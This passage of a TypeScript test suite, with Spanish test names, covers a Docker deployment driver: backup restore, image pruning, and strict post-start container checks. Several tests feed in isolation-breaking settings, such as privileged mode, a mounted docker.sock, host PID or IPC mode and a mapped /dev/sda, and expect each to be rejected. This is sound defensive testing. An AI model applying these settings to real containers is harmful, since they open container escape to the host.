    expect(stub.volumes.get(liveVolume)).toEqual({ 'otra': 'etiqueta' });
  });

  test('manifiesto con projectId distinto → rechazado sin tocar nada', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    makeValidBackup(dataDir);
    const liveVolume = projectLiveVolumeName(PID);
    stub.volumes.set(liveVolume, {
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.role': 'live',
    });
    // Reescribir el manifiesto con otro projectId.
    const bdir = backupDirFor(dataDir, PID, BACKUP_ID);
    const m = JSON.parse(fs.readFileSync(path.join(bdir, 'backup.json'), 'utf8')) as BackupManifest;
    m.projectId = '22222222-3333-4444-8555-666666666666';
    writeBackupManifest(bdir, m);
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/BACKUP_PROJECT_MISMATCH/);
    expect(stub.volumes.has(liveVolume)).toBe(true);
    expect(stub.calls.some((c) => c[0] === 'volume' && c[1] === 'rm')).toBe(false);
  });

  test('restauración válida: staging → swap → verificación, staging limpiado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    const { bytes } = makeValidBackup(dataDir);
    stub.hostFiles.set('app.db', bytes);
    const liveVolume = projectLiveVolumeName(PID);
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(true);
    // El volumen live existe con labels estables.
    const labels = stub.volumes.get(liveVolume)!;
    expect(labels['com.appforge.managed']).toBe('true');
    expect(labels['com.appforge.project-id']).toBe(PID);
    expect(labels['com.appforge.role']).toBe('live');
    // El staging se limpió.
    expect([...stub.volumes.keys()].some((n) => n.startsWith('appforge-restore-staging-'))).toBe(false);
  });
});

describe('B7: pruneManagedImages con scope y protegidos', () => {
  const FP = 'a'.repeat(64);
  const ref = (d8: string, sha12: string) => `appforge/app-${PID.slice(0, 8)}:dep-${d8}-${sha12}`;
  const managedLabels = (depId: string, withFp = true): Record<string, string> => ({
    'com.appforge.managed': 'true',
    'com.appforge.project-id': PID,
    'com.appforge.deployment-id': depId,
    'com.appforge.role': 'live',
    ...(withFp ? { 'com.appforge.source-fingerprint': FP } : {}),
  });

  async function setupPrune() {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    db.exec('CREATE TABLE IF NOT EXISTS project_runtime(project_id TEXT PRIMARY KEY, live_image TEXT, previous_image TEXT)');
    const stub = new StubDocker();
    const liveRef = ref(DID.slice(0, 8), FP.slice(0, 12));
    const oldRef = ref(DID2.slice(0, 8), FP.slice(0, 12));
    const otherRef = `appforge/app-99999999:dep-88888888-${FP.slice(0, 12)}`;
    const incompleteRef = ref('77777777', FP.slice(0, 12));
    const mkImg = (ref: string, id: string, labels: Record<string, string>): StubImage => ({
      id,
      repo: ref.split(':')[0]!,
      tag: ref.split(':')[1]!,
      labels,
      os: 'linux',
      arch: 'amd64',
      user: '1001',
    });
    const liveImg = mkImg(liveRef, 'sha256:' + '1'.repeat(64), managedLabels(DID));
    const oldImg = mkImg(oldRef, 'sha256:' + '2'.repeat(64), managedLabels(DID2));
    const otherImg = mkImg(otherRef, 'sha256:' + '3'.repeat(64), { ...managedLabels(DID2), 'com.appforge.project-id': '99999999-0000-4000-8000-000000000000' });
    const incompleteImg = mkImg(incompleteRef, 'sha256:' + '4'.repeat(64), managedLabels('77777777', false));
    for (const img of [liveImg, oldImg, otherImg, incompleteImg]) {
      // Registrar por ref y por id (la re-inspección usa el id).
      stub.images.set(`${img.repo}:${img.tag}`, img);
      stub.images.set(img.id, img);
    }
    db.prepare('INSERT INTO project_runtime(project_id, live_image, previous_image) VALUES (?,?,?)').run(PID, liveRef, oldRef);
    const d = makeDriver(dataDir, db, stub);
    return { d, stub, liveRef, oldRef, otherRef, incompleteRef };
  }

  test('protege live_image/previous_image, poda la antigua sin proteger, no toca otros proyectos', async () => {
    const { d, stub, liveRef, oldRef, otherRef, incompleteRef } = await setupPrune();
    // oldRef está protegida como previous_image: la desprotegemos para este caso.
    const db2 = (d as unknown as { db: Database.Database }).db;
    db2.prepare('UPDATE project_runtime SET previous_image=NULL WHERE project_id=?').run(PID);
    const { removed, failures } = await d.pruneManagedImages(PID);
    expect(removed).toContain(oldRef);
    expect(removed).not.toContain(liveRef);
    expect(removed).not.toContain(otherRef);
    expect(removed).not.toContain(incompleteRef);
    expect(stub.images.has(otherRef)).toBe(true); // otro proyecto intacto
    expect(failures.some((f) => f.includes('incomplete labels'))).toBe(true);
  });

  test('backups protegidos sobreviven: live_image y previous_image nunca se podan', async () => {
    const { d, stub, liveRef, oldRef } = await setupPrune();
    const { removed } = await d.pruneManagedImages(PID);
    expect(removed).not.toContain(liveRef);
    expect(removed).not.toContain(oldRef);
    expect(stub.images.has(liveRef)).toBe(true);
    expect(stub.images.has(oldRef)).toBe(true);
  });

  test('re-inspección exacta antes del rmi: labels cambiadas → no se elimina', async () => {
    const { d, stub, oldRef } = await setupPrune();
    const db2 = (d as unknown as { db: Database.Database }).db;
    db2.prepare('UPDATE project_runtime SET previous_image=NULL WHERE project_id=?').run(PID);
    // Simular que las labels cambiaron entre el listado y la re-inspección:
    // el inspect devuelve labels distintas a las listadas.
    const img = stub.images.get(oldRef)!;
    stub.inspectLabelOverride.set(img.id, { ...img.labels, 'com.appforge.source-fingerprint': 'b'.repeat(64) });
    const { removed, failures } = await d.pruneManagedImages(PID);
    expect(removed).not.toContain(oldRef);
    expect(failures.some((f) => f.includes('label re-inspection failed'))).toBe(true);
    expect(stub.images.has(oldRef)).toBe(true);
  });
});

describe('discardCandidate: imagen ajena con el nombre esperado', () => {
  test('no elimina una imagen ajena aunque el nombre coincida', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    // Sustituir la imagen por una ajena con el MISMO nombre pero labels distintas.
    const fp = (db.prepare('SELECT snapshot_fingerprint AS f FROM deployments WHERE id=?').get(DID) as { f: string }).f;
    const imgRef = `appforge/app-${PID.slice(0, 8)}:dep-${DID.slice(0, 8)}-${fp.slice(0, 12)}`;
    const foreign = stub.images.get(imgRef)!;
    foreign.labels = { 'com.appforge.managed': 'true', 'com.appforge.project-id': PID, 'com.appforge.deployment-id': 'otro', 'com.appforge.role': 'live', 'com.appforge.source-fingerprint': fp };
    const r = await d.discardCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/FOREIGN_RESOURCE/);
    expect(stub.images.has(imgRef)).toBe(true); // la ajena sobrevive
    expect(stub.calls.some((c) => c[0] === 'rmi')).toBe(false);
  });
});

describe('B8: validación posterior completa vía docker inspect', () => {
  const LIVE = `appforge-app-${PID.slice(0, 8)}`;

  function goodInspect(liveVolume: string, labels: Record<string, string>, imageRef: string) {
    return {
      Config: { Labels: labels, User: '1001', Image: imageRef },
      State: { Running: true },
      Mounts: [
        { Type: 'volume', Name: liveVolume, Source: liveVolume, Destination: '/data' },
        { Type: 'tmpfs', Destination: '/tmp' },
      ],
      NetworkSettings: { Networks: { 'appforge-apps': {} }, Ports: {} },
      HostConfig: {
        Memory: 512 * 1024 * 1024,
        MemorySwap: 512 * 1024 * 1024,
        NanoCpus: 1_000_000_000,
        PidsLimit: 128,
        CapDrop: ['ALL'],
        SecurityOpt: ['no-new-privileges'],
        ReadonlyRootfs: true,
        Privileged: false,
        Devices: [],
        PidMode: '',
        IpcMode: 'private',
        NetworkMode: 'appforge-apps',
        RestartPolicy: { Name: 'unless-stopped' },
      },
    };
  }

  async function startWith(overrides: (insp: Record<string, unknown>, ctx: { imgRef: string; stub: StubDocker }) => void) {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    const fp = (db.prepare('SELECT snapshot_fingerprint AS f FROM deployments WHERE id=?').get(DID) as { f: string }).f;
    const imgRef = `appforge/app-${PID.slice(0, 8)}:dep-${DID.slice(0, 8)}-${fp.slice(0, 12)}`;
    const liveVolume = projectLiveVolumeName(PID);
    const insp = goodInspect(liveVolume, {
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.deployment-id': DID,
      'com.appforge.role': 'live',
      'com.appforge.source-fingerprint': fp,
    }, imgRef) as unknown as Record<string, unknown>;
    overrides(insp, { imgRef, stub });
    stub.containerTemplate = insp;
    const r = await d.startCandidateAsLive(opArgs(PID, DID));
    return { r, stub };
  }

  test('contenedor conforme → ok', async () => {
    const { r } = await startWith(() => {});
    expect(r.ok).toBe(true);
  });

  test('privileged=true → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).Privileged = true;
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_PRIVILEGED/);
  });

  test('usuario root → rechazado (se exige 1001 exacto)', async () => {
    const { r } = await startWith((insp) => {
      (insp.Config as Record<string, unknown>).User = '0';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_USER_MISMATCH/);
  });

  test('montaje del socket de docker → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.Mounts as unknown[]).push({ Type: 'bind', Source: '/var/run/docker.sock', Destination: '/var/run/docker.sock' });
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_(SOCKET_MOUNT|MOUNT_UNEXPECTED)/);
  });

  test('montaje del volumen del Studio → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.Mounts as unknown[]).push({ Type: 'volume', Name: 'appforge-data', Source: 'appforge-data', Destination: '/studio' });
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_(STUDIO_VOLUME_MOUNT|MOUNT_UNEXPECTED)/);
  });

  test('arquitectura no soportada → rechazado', async () => {
    const { r } = await startWith((_insp, { imgRef, stub }) => {
      stub.images.get(imgRef)!.arch = 'riscv64';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/IMAGE_ARCH_MISMATCH/);
  });

  test('MemorySwap sin tope → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).MemorySwap = 0;
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_SWAP_MISMATCH/);
  });

  test('sin tmpfs en /tmp → rechazado', async () => {
    const { r } = await startWith((insp) => {
      insp.Mounts = (insp.Mounts as unknown[]).filter((m) => (m as { Destination: string }).Destination !== '/tmp');
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_TMPFS_MISMATCH/);
  });

  test('tmpfs solo en HostConfig.Tmpfs (otra versión de Docker) → ok', async () => {
    const { r } = await startWith((insp) => {
      // Algunas versiones de Docker no listan el tmpfs en Mounts.
      insp.Mounts = (insp.Mounts as unknown[]).filter((m) => (m as { Destination: string }).Destination !== '/tmp');
      (insp.HostConfig as Record<string, unknown>).Tmpfs = { '/tmp': 'rw,noexec,nosuid,size=64m' };
    });
    expect(r.ok).toBe(true);
  });

  test('mount no-tmpfs en /tmp aunque haya flag → rechazado', async () => {
    const { r } = await startWith((insp) => {
      insp.Mounts = [
        (insp.Mounts as unknown[])[0], // /data intacto
        { Type: 'volume', Name: 'sospechoso', Source: 'sospechoso', Destination: '/tmp' },
      ];
      (insp.HostConfig as Record<string, unknown>).Tmpfs = { '/tmp': 'rw,noexec,nosuid,size=64m' };
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_TMPFS_MISMATCH/);
  });

  test('PidMode=host → rechazado (solo valores exactos permitidos)', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).PidMode = 'host';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_PID_MODE/);
  });

  test('PidMode no permitido (container:otro) → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).PidMode = 'container:otro';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_PID_MODE/);
  });

  test('IpcMode=host → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).IpcMode = 'host';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_IPC_MODE/);
  });

  test('IpcMode no permitido (shareable) → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).IpcMode = 'shareable';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_IPC_MODE/);
  });

  test('Devices ausente → rechazado (debe estar explícitamente vacío)', async () => {
    const { r } = await startWith((insp) => {
      delete (insp.HostConfig as Record<string, unknown>).Devices;
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_DEVICES/);
  });

  test('Devices no vacío → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).Devices = [{ PathOnHost: '/dev/sda', PathInContainer: '/dev/xvda' }];
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_DEVICES/);
  });

  test('red adicional (bridge) → rechazado: exactamente una red', async () => {
    const { r } = await startWith((insp) => {
      (insp.NetworkSettings as Record<string, unknown>).Networks = { 'appforge-apps': {}, 'bridge': {} };
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_NETWORK_MISMATCH/);
  });

  test('sin redes → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.NetworkSettings as Record<string, unknown>).Networks = {};
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_NETWORK_MISMATCH/);
  });

  test('arquitectura de imagen distinta a la del daemon → rechazado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    stub.daemonArch = 'aarch64'; // daemon arm64, imagen amd64
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    const fp = (db.prepare('SELECT snapshot_fingerprint AS f FROM deployments WHERE id=?').get(DID) as { f: string }).f;
    const imgRef = `appforge/app-${PID.slice(0, 8)}:dep-${DID.slice(0, 8)}-${fp.slice(0, 12)}`;
    const liveVolume = projectLiveVolumeName(PID);
    stub.containerTemplate = {
      Config: {
        Labels: {
          'com.appforge.managed': 'true',
          'com.appforge.project-id': PID,
          'com.appforge.deployment-id': DID,
          'com.appforge.role': 'live',
          'com.appforge.source-fingerprint': fp,
        },
        User: '1001',
        Image: imgRef,
      },
      State: { Running: true },
      Mounts: [
        { Type: 'volume', Name: liveVolume, Source: liveVolume, Destination: '/data' },
        { Type: 'tmpfs', Destination: '/tmp' },
      ],
      NetworkSettings: { Networks: { 'appforge-apps': {} }, Ports: {} },
      HostConfig: {
        Memory: 512 * 1024 * 1024,
        MemorySwap: 512 * 1024 * 1024,
        NanoCpus: 1_000_000_000,
        PidsLimit: 128,
        CapDrop: ['ALL'],
        SecurityOpt: ['no-new-privileges'],
        ReadonlyRootfs: true,
        Privileged: false,
        Devices: [],
        PidMode: '',
        IpcMode: 'private',
        NetworkMode: 'appforge-apps',
        RestartPolicy: { Name: 'unless-stopped' },
      },
    };
    const r = await d.startCandidateAsLive(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/IMAGE_ARCH_MISMATCH/);
  });

  test('NetworkMode distinto → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).NetworkMode = 'bridge';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_NETWORKMODE_MISMATCH/);
  });
});

describe('NO-GO2 B6: verified_source_fingerprint fail closed en reuseSnapshot', () => {
  async function setupPersisted() {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    return { dataDir, db, stub, d };
  }

  test.each([
    ['NULL', null],
    ['vacío', ''],
    ['malformado (no hex)', 'xyz-no-es-un-fingerprint'],
    ['malformado (63 chars)', 'a'.repeat(63)],
    ['malformado (65 chars)', 'a'.repeat(65)],
  ])('fingerprint %s → rechazado (SNAPSHOT_SOURCE_FP_INVALID)', async (_label, bad) => {
    const { db, d } = await setupPersisted();
    db.prepare('UPDATE deployments SET verified_source_fingerprint=? WHERE id=?').run(bad, DID);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/SNAPSHOT_SOURCE_FP_INVALID/);
  });

  test('fingerprint distinto (bien formado) → SNAPSHOT_SOURCE_MISMATCH', async () => {
    const { db, d } = await setupPersisted();
    db.prepare('UPDATE deployments SET verified_source_fingerprint=? WHERE id=?').run('b'.repeat(64), DID);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/SNAPSHOT_SOURCE_MISMATCH/);
  });

  test('fingerprint válido e igual (distinto case) → reutilización ok', async () => {
    const { db, d } = await setupPersisted();
    const row = db
      .prepare('SELECT verified_source_fingerprint AS f FROM deployments WHERE id=?')
      .get(DID) as { f: string };
    db.prepare('UPDATE deployments SET verified_source_fingerprint=? WHERE id=?').run(row.f.toUpperCase(), DID);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(true);
  });
});

describe('NO-GO2 B5: normalización de arquitectura', () => {
  test('normalizeArch mapea x86_64→amd64 y aarch64→arm64', async () => {
    const { normalizeArch } = await import('./dockerDriver.js');
    expect(normalizeArch('x86_64')).toBe('amd64');
    expect(normalizeArch('aarch64')).toBe('arm64');
    expect(normalizeArch('amd64')).toBe('amd64');
    expect(normalizeArch('arm64')).toBe('arm64');
    expect(normalizeArch('X86_64\n')).toBe('amd64');
    expect(normalizeArch('riscv64')).toBe('riscv64');
  });

  test('preflight informa la arquitectura del daemon en el diagnóstico', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const stub = new StubDocker();
    stub.daemonArch = 'aarch64';
    const sock = path.join(dataDir, 'docker.sock');
    const server = net.createServer();
    await new Promise<void>((res) => server.listen(sock, () => res()));
    const cfg = { ...resolveDockerDriverConfig(BASE_ENV, dataDir)!, socketPath: sock };
    const r = await preflightDocker(stub.asRunner(), cfg);
    server.close();
    expect(r.ok).toBe(true);
    expect(r.diagnostics.join(' ')).toMatch(/daemon architecture: arm64/);
  });
});
